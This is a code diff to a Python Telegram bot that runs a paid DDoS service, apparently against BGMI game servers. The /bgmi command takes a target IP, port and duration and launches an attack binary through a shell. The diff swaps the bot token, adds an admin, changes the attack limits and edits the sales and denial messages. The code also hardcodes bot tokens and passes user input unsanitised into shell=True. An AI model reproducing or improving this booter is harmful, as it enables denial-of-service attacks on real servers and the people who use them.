@@ -9,10 +9,10 @@ import os
 # @PrivateFileTg #from keep_alive import keep_alive
 # @PrivateFileTg #keep_alive()
 # @PrivateFileTg # insert your Telegram bot token here
-bot = telebot.TeleBot('6489684306:AAFS4LOIxCVSj2mhcDPPPxihGVXjTp-uLeQ')
+bot = telebot.TeleBot('7273976322:AAGkGzq87YHP2GgqX-ZDhjvll9H9RSqX5Xs')
 
 # @PrivateFileTg # Admin user IDs
-admin_id = ["6436260909","1305141119"]
+admin_id = ["6436260909","1920313123","1305141119"]
 
 # @PrivateFileTg # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -300,7 +300,7 @@ def add_user(message):
         else:
             response = "Id bhejo kise add karna he \nlike this👇\n/add 000000000."
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 3 Bande Hi Use Kar Sakte Hn\n@JJ_MODZ_OWNER\n@JJ_MODZ_OWNERRR\nTEAMXHACKERR"
+        response = "@JJ_MODZ_OWNER\n@TeamXhackerr"
 
     bot.reply_to(message, response)
 
@@ -325,7 +325,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 3 Bande Hi Use Kar Sakte Hn\n@JJ_MODZ_OWNER\n@JJ_MODZ_OWNERRR\nTEAMXHACKERR"
+        response = "@JJ_MODZ_OWNER\n@TeamXhackerr"
 
     bot.reply_to(message, response)
 
@@ -345,7 +345,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 3 Bande Hi Use Kar Sakte Hn\n@JJ_MODZ_OWNER\n@JJ_MODZ_OWNERRR\nTEAMXHACKERR"
+        response = "@JJ_MODZ_OWNER\n@TeamXhackerr"
     bot.reply_to(message, response)
 
  
@@ -371,7 +371,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 3 Bande Hi Use Kar Sakte Hn\n@JJ_MODZ_OWNER\n@JJ_MODZ_OWNERRR\nTEAMXHACKERR"
+        response = "@JJ_MODZ_OWNER\n@TeamXhackerr"
     bot.reply_to(message, response)
 
 
@@ -390,7 +390,7 @@ def show_recent_logs(message):
             response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 3 Bande Hi Use Kar Sakte Hn\n@JJ_MODZ_OWNER\n@JJ_MODZ_OWNERRR\nTEAMXHACKERR"
+        response = "@JJ_MODZ_OWNER\n@TeamXhackerr"
         bot.reply_to(message, response)
 
 
@@ -405,7 +405,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, \n𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: TEAM X HACKER"
+    response = f"{username}, \n𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: TEAM X HACKER VIP"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -433,19 +433,19 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 500:
+            if time > 300:
                 response = "Error: Time interval must be less than 300."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 300"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
             response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nPeheAA SE BAAR KRO\n@JJ_MODZ_OWNERRR."
+        response = "🦋PEHLI JJ BHAI SE BUY KARLO THEN USE🙏"
 
     bot.reply_to(message, response)
 
@@ -467,7 +467,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 3 Bande Hi Use Kar Sakte Hn\n@JJ_MODZ_OWNER\n@JJ_MODZ_OWNERRR\nTEAMXHACKERR"
+        response = "@JJ_MODZ_OWNER\n@TeamXhackerr"
 
     bot.reply_to(message, response)
 
@@ -576,7 +576,7 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "JJ BHAI NE COMMAND DIYA HE KE YE AAP TAB BHEJU👇:\n\n" + command[1]
+            message_to_broadcast = "👇JJ BHAI NE MESSAGE BHEJA DEKLO👇:\n\n" + command[1]
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
                 for user_id in user_ids:
@@ -588,7 +588,7 @@ def broadcast_message(message):
         else:
             response = "🤖 Please Provide A Message To Broadcast."
     else:
-        response = "🫵Sorry Bhai Aap Ye Wala Button \n ✋Use Nhi Kar Sakte \nYe Command Sirf he 3 Bande Hi Use Kar Sakte Hn\n@JJ_MODZ_OWNER\n@JJ_MODZ_OWNERRR\nTEAMXHACKERR"
+        response = "@JJ_MODZ_OWNER\n@TeamXhackerr"
 
     bot.reply_to(message, response)
 
